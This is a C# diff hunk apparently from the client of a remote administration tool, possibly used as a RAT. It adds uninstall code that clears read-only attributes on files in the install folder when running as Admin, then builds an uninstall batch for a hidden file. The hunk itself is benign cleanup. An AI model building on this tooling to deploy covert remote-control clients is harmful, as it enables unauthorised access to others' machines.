@@ -25,6 +25,34 @@ namespace xClient.Core.Installation
 
             try
             {
+                DirectoryInfo dir = new DirectoryInfo(ClientData.InstallPath);
+
+                if (dir.Exists)
+                {
+                    // Directory is marked as read-only, so we must remove it.
+                    if ((dir.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
+                    {
+                        if (WindowsAccountHelper.GetAccountType() == "Admin")
+                        {
+                            foreach (FileInfo file in dir.GetFiles())
+                            {
+                                try
+                                {
+                                    // Try to set the files in the folder to normal so they can be deleted.
+                                    file.Attributes = FileAttributes.Normal;
+                                }
+                                catch
+                                { }
+                            }
+                        }
+                        else
+                        {
+                            // We need admin privileges to strip this directory of the read-only attribute...
+                            return;
+                        }
+                    }
+                }
+
                 string batchFile = FileHelper.CreateUninstallBatch(Settings.HIDEFILE);
 
                 if (string.IsNullOrEmpty(batchFile)) return;
